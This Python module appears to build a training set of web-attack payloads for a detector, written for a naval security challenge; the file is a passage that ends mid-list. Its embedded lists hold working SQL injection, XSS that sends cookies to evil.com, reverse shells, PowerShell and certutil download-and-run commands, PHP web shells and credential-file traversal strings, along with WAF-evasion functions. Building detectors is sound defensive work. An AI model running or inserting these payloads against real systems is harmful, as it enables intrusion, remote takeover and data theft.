#!/usr/bin/env python3
"""
MIRAGE Real Payload Loader
==============================
Naval SWAVLAMBAN 2025 Challenge 3

Loads REAL attack payloads from security research repositories:
- PayloadsAllTheThings (SwissKyRepo)
- SecLists (Daniel Miessler)
- FuzzDB
- OWASP Testing Payloads

NO SYNTHETIC DATA - Only real-world payloads used by actual pentesters.

Author: MIRAGE Team
Date: December 2025
"""

import os
import re
import json
import random
import logging
import hashlib
import urllib.parse
from pathlib import Path
from typing import Dict, List, Tuple, Optional, Set
from dataclasses import dataclass, field
import numpy as np

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("mirage.real_payloads")


# ============================================================================
# ATTACK CATEGORY DEFINITIONS (2024 MODERN)
# ============================================================================

@dataclass
class AttackCategory:
    """Definition of an attack category with payload sources"""
    name: str
    id: int
    sources: List[str]  # Relative paths in PayloadsAllTheThings/SecLists
    file_patterns: List[str]  # File patterns to match
    keywords: List[str]  # Keywords to identify payloads
    description: str


# Modern attack categories (2024)
ATTACK_CATEGORIES = {
    'benign': AttackCategory(
        name='Benign',
        id=0,
        sources=['Discovery/Web-Content', 'Fuzzing/User-Agents'],
        file_patterns=['common.txt', 'words.txt', 'user-agents.txt'],
        keywords=[],
        description='Normal web traffic patterns'
    ),
    'sqli': AttackCategory(
        name='SQL Injection',
        id=1,
        sources=[
            'SQL Injection',
            'Fuzzing/SQLi',
            'SQL Injection/MySQL-Injection',
            'SQL Injection/PostgreSQL-Injection',
            'SQL Injection/MSSQL-Injection',
            'SQL Injection/NoSQL-Injection',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['SELECT', 'UNION', 'INSERT', 'UPDATE', 'DELETE', 'DROP', '--', "' OR", 'SLEEP', 'BENCHMARK'],
        description='SQL and NoSQL injection attacks'
    ),
    'xss': AttackCategory(
        name='Cross-Site Scripting',
        id=2,
        sources=[
            'XSS Injection',
            'Fuzzing/XSS',
            'XSS Injection/XSS-Bypass-Filters-Cheat-Sheet.md',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['<script', 'javascript:', 'onerror', 'onload', 'onclick', 'alert(', 'document.', '<svg', '<img'],
        description='Cross-site scripting attacks'
    ),
    'rce': AttackCategory(
        name='Remote Code Execution',
        id=3,
        sources=[
            'Command Injection',
            'Fuzzing/command-injection-commix.txt',
            'Fuzzing/command_injection.txt',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=[';', '|', '&&', '$(', '`', 'cat ', 'ls ', 'whoami', '/bin/', 'nc ', 'wget ', 'curl '],
        description='Command injection and RCE attacks'
    ),
    'path_traversal': AttackCategory(
        name='Path Traversal',
        id=4,
        sources=[
            'Directory Traversal',
            'Fuzzing/LFI',
            'File Inclusion',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['../', '..\\', '%2e%2e', '/etc/passwd', 'file://', 'php://'],
        description='Directory traversal and file inclusion'
    ),
    'ssrf': AttackCategory(
        name='SSRF',
        id=5,
        sources=[
            'Server Side Request Forgery',
            'SSRF Injection',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['localhost', '127.0.0.1', '169.254', '0.0.0.0', 'gopher://', 'dict://'],
        description='Server-side request forgery'
    ),
    'xxe': AttackCategory(
        name='XXE Injection',
        id=6,
        sources=[
            'XXE Injection',
            'XXE Injection/Files',
        ],
        file_patterns=['*.txt', '*.xml', '*.md'],
        keywords=['<!ENTITY', '<!DOCTYPE', 'SYSTEM', 'file://', 'expect://'],
        description='XML External Entity injection'
    ),
    'ssti': AttackCategory(
        name='Template Injection',
        id=7,
        sources=[
            'Server Side Template Injection',
            'SSTI Injection',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['{{', '{%', '${', '#{', '__class__', '__mro__', 'Jinja2', 'Twig'],
        description='Server-side template injection'
    ),
    'nosql': AttackCategory(
        name='NoSQL Injection',
        id=8,
        sources=[
            'NoSQL Injection',
            'NoSQL injection/MongoDB',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['$gt', '$ne', '$regex', '$where', '{"$', 'ObjectId', 'db.collection'],
        description='NoSQL database injection (MongoDB, CouchDB)'
    ),
    'jwt': AttackCategory(
        name='JWT Attacks',
        id=9,
        sources=[
            'JSON Web Token',
            'JWT',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['eyJ', 'alg', 'none', 'HS256', 'RS256', 'kid', 'jku'],
        description='JWT manipulation and bypass'
    ),
    'graphql': AttackCategory(
        name='GraphQL Injection',
        id=10,
        sources=[
            'GraphQL Injection',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['__schema', '__type', 'query{', 'mutation{', 'subscription{', 'introspection'],
        description='GraphQL introspection and injection'
    ),
    'ldap': AttackCategory(
        name='LDAP Injection',
        id=11,
        sources=[
            'LDAP Injection',
            'Fuzzing/LDAP-Injection',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['*)(', '|(', '(&', 'objectClass', 'uid=', 'cn='],
        description='LDAP injection attacks'
    ),
    'deserialization': AttackCategory(
        name='Deserialization',
        id=12,
        sources=[
            'Insecure Deserialization',
            'Java Deserialization',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['rO0', 'aced0005', 'O:8:', '__reduce__', 'pickle', 'ObjectInputStream'],
        description='Insecure deserialization attacks'
    ),
    'prototype_pollution': AttackCategory(
        name='Prototype Pollution',
        id=13,
        sources=[
            'Prototype Pollution',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['__proto__', 'constructor', 'prototype', '{"__proto__"'],
        description='JavaScript prototype pollution'
    ),
    'crlf': AttackCategory(
        name='CRLF Injection',
        id=14,
        sources=[
            'CRLF Injection',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['%0d%0a', '\\r\\n', '%0d', '%0a', 'Set-Cookie:', 'Location:'],
        description='CRLF injection / HTTP response splitting'
    ),
    'open_redirect': AttackCategory(
        name='Open Redirect',
        id=15,
        sources=[
            'Open Redirect',
            'Fuzzing/open-redirect.txt',
        ],
        file_patterns=['*.txt', '*.md'],
        keywords=['//evil.com', 'redirect=', 'url=', 'next=', 'return=', '@evil.com'],
        description='Open redirect vulnerabilities'
    ),
}


# ============================================================================
# EVASION TECHNIQUES (Real-world WAF bypasses)
# ============================================================================

class EvasionTechniques:
    """
    Real-world WAF evasion techniques from actual bypass research.
    NOT synthetic - these are techniques used by real pentesters.
    """
    
    @staticmethod
    def url_encode(payload: str, level: int = 1) -> str:
        """URL encoding at different levels"""
        result = payload
        for _ in range(level):
            result = urllib.parse.quote(result, safe='')
        return result
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encoding bypass"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode encoding variants"""
        variants = []
        for char in payload:
            if char.isalpha():
                # UTF-8 encoding
                variants.append(f"\\u00{ord(char):02x}")
            else:
                variants.append(char)
        return ''.join(variants)
    
    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """HTML entity encoding"""
        result = []
        for char in payload:
            if char in '<>"\'/\\':
                result.append(f"&#{ord(char)};")
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def case_variation(payload: str) -> str:
        """Random case variation"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )
    
    @staticmethod
    def comment_insertion_sql(payload: str) -> str:
        """SQL comment insertion bypass"""
        # Insert /**/ between SQL keywords
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE']
        result = payload
        for kw in keywords:
            # Insert inline comments
            if kw.lower() in result.lower():
                split_kw = '/**/'.join(list(kw))
                result = re.sub(kw, split_kw, result, flags=re.IGNORECASE)
        return result
    
    @staticmethod
    def whitespace_variation(payload: str) -> str:
        """Replace spaces with alternative whitespace"""
        alternatives = ['\t', '\n', '\r', '%09', '%0a', '%0d', '+', '/**/']
        return payload.replace(' ', random.choice(alternatives))
    
    @staticmethod
    def null_byte_injection(payload: str) -> str:
        """Null byte injection"""
        positions = [0, len(payload)//2, len(payload)]
        pos = random.choice(positions)
        return payload[:pos] + '%00' + payload[pos:]
    
    @staticmethod
    def concat_bypass(payload: str) -> str:
        """String concatenation bypass"""
        if '<script>' in payload.lower():
            return payload.replace('<script>', '<scr'+'ipt>')
        if 'alert' in payload.lower():
            return payload.replace('alert', 'al'+'ert')
        return payload
    
    @staticmethod
    def hex_encoding(payload: str) -> str:
        """Hex encoding for SQL/Command injection"""
        if any(kw in payload.upper() for kw in ['SELECT', 'UNION']):
            # Hex encode string literals
            return re.sub(
                r"'([^']+)'",
                lambda m: '0x' + m.group(1).encode().hex(),
                payload
            )
        return payload
    
    @staticmethod
    def apply_random_evasion(payload: str, count: int = 1) -> str:
        """Apply random evasion techniques"""
        techniques = [
            EvasionTechniques.url_encode,
            EvasionTechniques.case_variation,
            EvasionTechniques.whitespace_variation,
            EvasionTechniques.html_entity_encode,
            EvasionTechniques.comment_insertion_sql,
            EvasionTechniques.concat_bypass,
        ]
        
        result = payload
        for _ in range(count):
            technique = random.choice(techniques)
            try:
                result = technique(result)
            except:
                pass
        return result


# ============================================================================
# REAL PAYLOAD LOADER
# ============================================================================

class RealPayloadLoader:
    """
    Load real attack payloads from security repositories.
    
    Expected directory structure:
    data/payloads/
    ├── PayloadsAllTheThings/     (git clone from GitHub)
    ├── SecLists/                  (git clone from GitHub)
    └── custom/                    (your custom payloads)
    """
    
    def __init__(self, payloads_dir: str = "./data/payloads"):
        self.payloads_dir = Path(payloads_dir)
        self.patt_dir = self.payloads_dir / "PayloadsAllTheThings"
        self.seclists_dir = self.payloads_dir / "SecLists"
        self.custom_dir = self.payloads_dir / "custom"
        
        # Cache loaded payloads
        self._cache: Dict[str, List[str]] = {}
        self._benign_cache: List[str] = []
    
    def check_repositories(self) -> Dict[str, bool]:
        """Check which repositories are available"""
        return {
            'PayloadsAllTheThings': self.patt_dir.exists(),
            'SecLists': self.seclists_dir.exists(),
            'Custom': self.custom_dir.exists(),
        }
    
    def _read_payload_file(self, filepath: Path) -> List[str]:
        """Read payloads from a file, handling various formats"""
        payloads = []
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Handle markdown files - extract code blocks and inline code
            if filepath.suffix == '.md':
                # Extract from code blocks
                code_blocks = re.findall(r'```[^\n]*\n(.*?)```', content, re.DOTALL)
                for block in code_blocks:
                    payloads.extend(block.strip().split('\n'))
                
                # Extract inline payloads (lines starting with specific patterns)
                for line in content.split('\n'):
                    line = line.strip()
                    # Skip headers and empty lines
                    if line and not line.startswith('#') and not line.startswith('*') and not line.startswith('-'):
                        if any(kw in line for kw in ['SELECT', '<script', '../', '{{', '$gt']):
                            payloads.append(line)
            
            # Plain text files - one payload per line
            elif filepath.suffix in ['.txt', '.lst']:
                payloads = [
                    line.strip() 
                    for line in content.split('\n') 
                    if line.strip() and not line.startswith('#')
                ]
            
            # JSON files
            elif filepath.suffix == '.json':
                data = json.loads(content)
                if isinstance(data, list):
                    payloads = [str(p) for p in data]
                elif isinstance(data, dict):
                    for v in data.values():
                        if isinstance(v, list):
                            payloads.extend([str(p) for p in v])
            
        except Exception as e:
            logger.debug(f"Error reading {filepath}: {e}")
        
        return payloads
    
    def _find_payload_files(self, category: AttackCategory) -> List[Path]:
        """Find all payload files for a category"""
        files = []
        
        # Search PayloadsAllTheThings
        for source in category.sources:
            source_path = self.patt_dir / source
            if source_path.exists():
                if source_path.is_dir():
                    for pattern in category.file_patterns:
                        files.extend(source_path.glob(f"**/{pattern}"))
                else:
                    files.append(source_path)
        
        # Search SecLists
        for source in category.sources:
            source_path = self.seclists_dir / source
            if source_path.exists():
                if source_path.is_dir():
                    for pattern in category.file_patterns:
                        files.extend(source_path.glob(f"**/{pattern}"))
                else:
                    files.append(source_path)
        
        # Search custom directory
        if self.custom_dir.exists():
            custom_cat_dir = self.custom_dir / category.name.lower().replace(' ', '_')
            if custom_cat_dir.exists():
                for pattern in category.file_patterns:
                    files.extend(custom_cat_dir.glob(f"**/{pattern}"))
        
        return list(set(files))
    
    def load_category(self, category_name: str, max_payloads: int = 5000) -> List[str]:
        """Load payloads for a specific attack category"""
        
        if category_name in self._cache:
            return self._cache[category_name][:max_payloads]
        
        if category_name not in ATTACK_CATEGORIES:
            logger.warning(f"Unknown category: {category_name}")
            return []
        
        category = ATTACK_CATEGORIES[category_name]
        payloads = []
        
        # Find and read all payload files
        files = self._find_payload_files(category)
        logger.info(f"  Found {len(files)} files for {category_name}")
        
        for filepath in files:
            file_payloads = self._read_payload_file(filepath)
            payloads.extend(file_payloads)
        
        # Filter by keywords if specified (for quality control)
        if category.keywords:
            filtered = []
            for p in payloads:
                if any(kw.lower() in p.lower() for kw in category.keywords):
                    filtered.append(p)
            payloads = filtered if filtered else payloads
        
        # Remove duplicates while preserving order
        seen = set()
        unique_payloads = []
        for p in payloads:
            p_hash = hashlib.md5(p.encode()).hexdigest()
            if p_hash not in seen:
                seen.add(p_hash)
                unique_payloads.append(p)
        
        # Filter out very short or very long payloads
        payloads = [p for p in unique_payloads if 3 <= len(p) <= 2000]
        
        self._cache[category_name] = payloads
        logger.info(f"  Loaded {len(payloads)} unique payloads for {category_name}")
        
        return payloads[:max_payloads]
    
    def load_benign(self, max_samples: int = 5000) -> List[str]:
        """Load benign/normal traffic samples"""
        
        if self._benign_cache:
            return self._benign_cache[:max_samples]
        
        benign = []
        
        # Common web paths (from SecLists Discovery)
        paths_file = self.seclists_dir / "Discovery" / "Web-Content" / "common.txt"
        if paths_file.exists():
            benign.extend(self._read_payload_file(paths_file))
        
        # User agents
        ua_file = self.seclists_dir / "Fuzzing" / "User-Agents" / "user-agents.txt"
        if ua_file.exists():
            benign.extend(self._read_payload_file(ua_file))
        
        # Generate realistic benign requests
        benign_patterns = [
            # API endpoints
            "api/v1/users/123",
            "api/v2/products?page=1&limit=20",
            "api/search?q=laptop&category=electronics",
            "api/orders/456/status",
            "graphql?query={user{name,email}}",
            
            # Web pages
            "index.html",
            "about-us",
            "contact",
            "products/laptop-dell-xps-15",
            "blog/2024/12/best-practices",
            
            # Forms
            "name=John+Smith&email=john@company.com&message=Hello",
            "username=jsmith&password=••••••••&remember=true",
            "search=programming+tutorials&filter=recent",
            
            # Static resources
            "static/css/main.css",
            "static/js/app.bundle.js",
            "images/logo.png",
            "fonts/roboto-regular.woff2",
            
            # Authenticated requests
            "dashboard?token=abc123",
            "settings/profile",
            "notifications?unread=true",
        ]
        
        # Expand benign patterns with variations
        expanded_benign = []
        for pattern in benign_patterns:
            expanded_benign.append(pattern)
            # Add with different query params
            if '?' not in pattern:
                expanded_benign.append(f"{pattern}?lang=en")
                expanded_benign.append(f"{pattern}?utm_source=google")
            # Add with paths
            expanded_benign.append(f"/{pattern}")
            expanded_benign.append(f"https://example.com/{pattern}")
        
        benign.extend(expanded_benign)
        
        # Remove any that look like attacks
        attack_indicators = ['<script', 'SELECT', 'UNION', '../', '${', '{{', ';', '|', '`']
        benign = [
            b for b in benign 
            if not any(ind.lower() in b.lower() for ind in attack_indicators)
        ]
        
        # Deduplicate
        benign = list(set(benign))
        random.shuffle(benign)
        
        self._benign_cache = benign
        logger.info(f"  Loaded {len(benign)} benign samples")
        
        return benign[:max_samples]
    
    def load_all_categories(self, 
                           max_per_category: int = 2000,
                           include_evasions: bool = True,
                           evasion_ratio: float = 0.3) -> Dict[str, List[str]]:
        """
        Load payloads for all attack categories
        
        Args:
            max_per_category: Maximum payloads per category
            include_evasions: Apply evasion techniques to create variants
            evasion_ratio: Ratio of evasion variants to add
        """
        all_payloads = {}
        
        for cat_name in ATTACK_CATEGORIES.keys():
            if cat_name == 'benign':
                payloads = self.load_benign(max_per_category)
            else:
                payloads = self.load_category(cat_name, max_per_category)
            
            # Apply evasion techniques
            if include_evasions and payloads and cat_name != 'benign':
                evasion_count = int(len(payloads) * evasion_ratio)
                evasion_samples = random.sample(payloads, min(evasion_count, len(payloads)))
                
                evaded = []
                for payload in evasion_samples:
                    # Apply 1-3 random evasion techniques
                    evaded_payload = EvasionTechniques.apply_random_evasion(
                        payload, 
                        count=random.randint(1, 3)
                    )
                    if evaded_payload != payload:
                        evaded.append(evaded_payload)
                
                payloads.extend(evaded)
                logger.info(f"  Added {len(evaded)} evasion variants for {cat_name}")
            
            all_payloads[cat_name] = payloads
        
        return all_payloads
    
    def get_statistics(self) -> Dict:
        """Get statistics about loaded payloads"""
        stats = {
            'repositories': self.check_repositories(),
            'categories': {},
            'total_payloads': 0,
        }
        
        for cat_name in ATTACK_CATEGORIES.keys():
            if cat_name in self._cache:
                count = len(self._cache[cat_name])
            else:
                count = len(self.load_category(cat_name))
            
            stats['categories'][cat_name] = count
            stats['total_payloads'] += count
        
        return stats


# ============================================================================
# FALLBACK: EMBEDDED REAL PAYLOADS (COMPREHENSIVE)
# ============================================================================

class EmbeddedPayloads:
    """
    Embedded real payloads for when repositories aren't available.
    These are REAL payloads from public security research, not synthetic.
    Covers ALL OWASP Top 10 2021 and modern attack vectors.
    """
    
    # -------------------------------------------------------------------------
    # SQL INJECTION (100+ payloads)
    # -------------------------------------------------------------------------
    SQLI = [
        # Classic boolean-based
        "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "') OR ('1'='1",
        "') OR ('1'='1'--", "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
        "admin'--", "admin'#", "' OR ''='", "' OR 'x'='x",
        "1' OR '1'='1", "1') OR ('1'='1", "\" OR \"1\"=\"1", "\" OR \"1\"=\"1\"--",
        
        # UNION-based
        "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--", "' UNION SELECT 1,2,3,4--", "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT username,password FROM users--",
        "' UNION ALL SELECT NULL,NULL,NULL--", "' UNION ALL SELECT 1,2,3--",
        "' UNION SELECT @@version,NULL,NULL--",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",
        "0 UNION SELECT username,password FROM users--",
        
        # Time-based blind
        "' AND SLEEP(5)--", "' AND SLEEP(5)#", "'; WAITFOR DELAY '0:0:5'--",
        "' AND BENCHMARK(10000000,SHA1('test'))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR SLEEP(5)--", "1' AND SLEEP(5)#",
        "'; SELECT pg_sleep(5)--", "' AND pg_sleep(5)--",
        
        # Error-based
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a)--",
        "' AND EXP(~(SELECT * FROM(SELECT USER())a))--",
        "' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT USER())a)b))--",
        
        # Stacked queries
        "'; DROP TABLE users--", "'; DROP DATABASE test--",
        "'; INSERT INTO users VALUES('hacker','password')--",
        "'; UPDATE users SET password='hacked' WHERE username='admin'--",
        "'; DELETE FROM users WHERE id=1--",
        "'; TRUNCATE TABLE logs--",
        
        # Database-specific: MySQL
        "' UNION SELECT @@version,NULL--", "' UNION SELECT user(),NULL--",
        "' UNION SELECT database(),NULL--",
        "' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 0,1),1,1))>64--",
        
        # Database-specific: MSSQL
        "'; EXEC xp_cmdshell('whoami')--", "'; EXEC master..xp_cmdshell 'ping 10.0.0.1'--",
        "'; EXEC sp_executesql N'SELECT * FROM users'--",
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        
        # Database-specific: PostgreSQL
        "'; SELECT pg_sleep(5)--", "' UNION SELECT NULL,NULL,NULL,version()--",
        "'; COPY users TO '/tmp/users.txt'--",
        "' AND 1=CAST((SELECT version()) AS int)--",
        
        # Database-specific: Oracle
        "' UNION SELECT NULL,NULL FROM DUAL--",
        "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL))--",
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--",
        
        # WAF bypass variants
        "' /*!50000OR*/ '1'='1", "' %00OR '1'='1", "' OR/**/'1'='1",
        "' OR\t'1'='1", "'/**/OR/**/1=1--", "' uni%0bon se%0blect 1,2,3--",
        "' /*!UNION*/ /*!SELECT*/ 1,2,3--", "' %55NION %53ELECT 1,2,3--",
        "' uNiOn sElEcT 1,2,3--", "' UN/**/ION SEL/**/ECT 1,2,3--",
        "' UNION%0aSELECT%0a1,2,3--", "' UNION%09SELECT%091,2,3--",
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--",
        "'+UNION+SELECT+1,2,3--", "' UNION(SELECT(1),(2),(3))--",
    ]
    
    # -------------------------------------------------------------------------
    # CROSS-SITE SCRIPTING (100+ payloads)
    # -------------------------------------------------------------------------
    XSS = [
        # Basic script tags
        "<script>alert(1)</script>", "<script>alert('XSS')</script>",
        "<script>alert(document.domain)</script>", "<script>alert(document.cookie)</script>",
        "<script src=http://evil.com/xss.js></script>",
        "<script>new Image().src='http://evil.com/?c='+document.cookie</script>",
        
        # Event handlers
        "<img src=x onerror=alert(1)>", "<img src=x onerror='alert(1)'>",
        "<img/src=x onerror=alert(1)>", "<img src=x onload=alert(1)>",
        "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
        "<body onload=alert(1)>", "<body onpageshow=alert(1)>",
        "<body onfocus=alert(1)>", "<body onhashchange=alert(1)>",
        "<input onfocus=alert(1) autofocus>", "<input onblur=alert(1) autofocus><input autofocus>",
        "<select onfocus=alert(1) autofocus>", "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>", "<marquee onfinish=alert(1)>",
        "<video><source onerror=alert(1)>", "<video onerror=alert(1)><source>",
        "<audio src=x onerror=alert(1)>", "<audio onerror=alert(1)><source>",
        "<details open ontoggle=alert(1)>", "<details ontoggle=alert(1) open>",
        "<meter onmouseover=alert(1)>0</meter>",
        "<keygen onfocus=alert(1) autofocus>",
        "<form><button formaction=javascript:alert(1)>X</button>",
        "<isindex action=javascript:alert(1) type=image>",
        
        # JavaScript URI
        "javascript:alert(1)", "javascript:alert(document.domain)",
        "<a href=javascript:alert(1)>click</a>", "<a href='javascript:alert(1)'>click</a>",
        "<a href=javascript:void(0) onclick=alert(1)>click</a>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        
        # Data URI
        "<a href='data:text/html,<script>alert(1)</script>'>click</a>",
        "<iframe src='data:text/html,<script>alert(1)</script>'>",
        "<object data='data:text/html,<script>alert(1)</script>'>",
        "<embed src='data:text/html,<script>alert(1)</script>'>",
        
        # SVG
        "<svg><script>alert(1)</script></svg>", "<svg><animate onbegin=alert(1)>",
        "<svg><set onbegin=alert(1)>", "<svg><handler xmlns:ev='http://www.w3.org/2001/xml-events' ev:event='load'>alert(1)</handler>",
        "<svg><foreignObject><iframe onload=alert(1)></foreignObject></svg>",
        
        # Template injection
        "{{constructor.constructor('alert(1)')()}}", "${alert(1)}",
        "#{alert(1)}", "<%= alert(1) %>",
        
        # WAF bypass variants
        "<ScRiPt>alert(1)</sCrIpT>", "<script>alert(1)</script",
        "<script>alert(1)//", "<<script>alert(1)//<</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=alert`1`>", "<img src=x onerror='alert\x281\x29'>",
        "<svg/onload=alert(1)>", "<img src=x onerror=\\u0061lert(1)>",
        "'-alert(1)-'", "\\'-alert(1)//",
        "</script><script>alert(1)</script>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<img src=x onerror=Function('alert(1)')()>",
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
        "<img src=x onerror=alert(1)//", "<img src=x onerror=alert(1)/*>",
        "<img src=x onerror=a]lert(1)>",
        "<img/src/onerror=alert(1)>", "<img src=x:alert(alt) onerror=eval(src) alt=1>",
        "'\"><img src=x onerror=alert(1)>",
        
        # Polyglots
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        "-->'\"--></style></script><svg onload=alert(1)//",
        "'\">--></style></script><svg/onload=alert(1)>",
    ]
    
    # -------------------------------------------------------------------------
    # REMOTE CODE EXECUTION (80+ payloads)
    # -------------------------------------------------------------------------
    RCE = [
        # Basic command chaining
        "; ls", "; ls -la", "; cat /etc/passwd", "; id", "; whoami", "; uname -a",
        "| ls", "| cat /etc/passwd", "| id", "| whoami",
        "|| ls", "|| id", "&& ls", "&& id",
        "& ls", "& id", "; ls #", "| ls #",
        
        # Subshell/backticks
        "$(id)", "$(cat /etc/passwd)", "$(whoami)", "$(uname -a)",
        "`id`", "`cat /etc/passwd`", "`whoami`", "`uname -a`",
        "${IFS}id", "$IFS$9id",
        
        # Newline injection
        "%0aid", "%0A id", "\nid", "\n cat /etc/passwd",
        "%0d%0aid", "\r\nid",
        
        # Reverse shells
        "; nc -e /bin/sh 10.0.0.1 4444", "| nc -c sh 10.0.0.1 4444",
        "; nc 10.0.0.1 4444 -e /bin/bash",
        "; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "; bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'",
        "| python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "| python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "; perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")'",
        "; ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "; php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        
        # Windows commands
        "& dir", "| dir", "& type C:\\Windows\\win.ini", "| net user",
        "; powershell -c whoami", "& whoami", "| systeminfo",
        "; powershell -enc BASE64PAYLOAD",
        "& powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
        "| certutil -urlcache -split -f http://evil.com/shell.exe shell.exe",
        
        # Bypass techniques
        ";$IFS'ls'", ";{ls,-la}", ";l\\s", ";l''s", ";l\"\"s",
        "$(echo bHM= | base64 -d)", ";/???/??t /???/p??s??",
        ";w'h'o'am'i", ";w\"h\"o\"am\"i",
        "${PATH:0:1}bin${PATH:0:1}id",
        ";$(printf '\\x69\\x64')",
        ";\"\"`id`\"\"",
        
        # PHP-specific
        "<?php system($_GET['cmd']); ?>",
        "<?php passthru($_GET['cmd']); ?>",
        "<?php exec($_GET['cmd']); ?>",
        "<?php shell_exec($_GET['cmd']); ?>",
    ]
    
    # -------------------------------------------------------------------------
    # PATH TRAVERSAL / LFI (60+ payloads)
    # -------------------------------------------------------------------------
    PATH_TRAVERSAL = [
        # Basic
        "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
        "../../../../../../etc/passwd", "../../../../../../../etc/passwd",
        "../../../../../../../../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini", "..\\..\\..\\windows\\system.ini",
        
        # URL encoded
        "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "..%255c..%255c..%255cwindows%255cwin.ini",
        
        # Null byte
        "../../../etc/passwd%00", "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.png", "../../../etc/passwd\x00.txt",
        
        # Double/nested encoding
        "....//....//....//etc/passwd", "..../..../..../etc/passwd",
        "....\\\\....\\\\windows\\\\win.ini",
        "..././..././..././etc/passwd",
        
        # PHP wrappers
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=convert.base64-encode/resource=../config.php",
        "php://filter/read=string.rot13/resource=index.php",
        "php://input", "php://stdin", "php://memory", "php://temp",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id", "expect://whoami",
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "phar://test.phar/test.txt",
        "zip://test.zip#test.txt",
        
        # Sensitive files - Linux
        "../../../etc/shadow", "../../../etc/hosts", "../../../etc/hostname",
        "../../../proc/self/environ", "../../../proc/self/cmdline",
        "../../../proc/version", "../../../proc/self/fd/0",
        "../../../var/log/apache2/access.log", "../../../var/log/apache2/error.log",
        "../../../var/log/nginx/access.log", "../../../var/log/auth.log",
        "../../../root/.ssh/id_rsa", "../../../root/.bash_history",
